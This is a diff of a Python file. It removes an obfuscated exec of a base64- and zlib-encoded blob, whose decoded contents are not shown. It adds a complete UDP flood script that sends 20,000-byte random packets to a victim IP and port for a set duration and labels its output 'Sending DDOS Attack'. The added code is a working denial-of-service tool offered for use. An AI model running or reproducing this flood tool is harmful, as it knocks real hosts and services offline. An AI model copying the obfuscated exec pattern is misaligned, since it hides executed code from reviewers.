@@ -1,2 +1,33 @@
-import zlib,base64
-exec(zlib.decompress(base64.b64decode("eJx1U11vmzAUfedX3DBVBRWhEipNXUWlrNmqatoajW576CLLA5NawZjZJlP26+evgNg0P8D1/TrnHi6U9VwoUJSRgDpb8mpP1OkmcFdzNsaOMqhJA4PEOxLFbwLQpxe0UxB+v8zz5+wmX7JNS7Ak8ND1g4KvuKW1thsuGFaUd3IR2h5Ny3kdHWilwRM4mP4J1IOwSb71KyiH3iKvBP0J95gR8bsSuFELH78TRBd0OyiJOBABYfl49wGt7z+vPobwZb0BdeyJpsh3AjNbU7WUaL6FHzR1r8jfVu/Rw6d3T8kpOrWLPeLyUh94e1REwhP3uDb2w/oKr1mKBmdEtsKVG6H5YNCtmZpHFMPFOLjNko5grssC6/j1QlsCmRPFHNrM6m9PjacMS0iLsx89pJVkHu+xlKPD6ZJq7FrxyM6SwPz7xPGY7Sna1wVko3++DNcZs9b16xtv5Vdswr+dglAqLOyHnPboTMLUp9S8THi9fixhpRSu9v9L/UbVC2zM1swSwrPI0NWzzGayy8gw7eb73JIu0uueYrE7uLG15jMnLAq4mgT1/0Twr9Ru0091z9k2AY0wOZbb+C9PvtVSBxoQoU7vPEJQFHCOkKGJ0Llr7TgHwR9Aixlx")))
+import time
+import socket
+import random
+import sys
+def usage():
+    print "\033[1;32mPlease Input Valid Informations!"
+def flood(victim, vport, duration):
+    # Support ~Ariq!
+    # Creating Server "SOCK_DGRAM" UDP type program
+    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    # 20000 Bytes To Server
+    bytes = random._urandom(20000)
+    timeout =  time.time() + duration
+    sent = 3000
+
+    while 1:
+        if time.time() > timeout:
+            break
+        else:
+            pass
+        client.sendto(bytes, (victim, vport))
+        sent = sent + 1
+        print "\033[1;91m\033[97;1m\033[34m          >\033[97;1m Starting \033[1;32m%s \033[1;91mSending DDOS Attack \033[1;32m%s \033[1;91mWith Port \033[1;32m%s "%(sent, victim, vport)
+def main():
+    print len(sys.argv)
+    if len(sys.argv) != 4:
+        usage()
+    else:
+        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
+
+if __name__ == '__main__':
+    main()
+
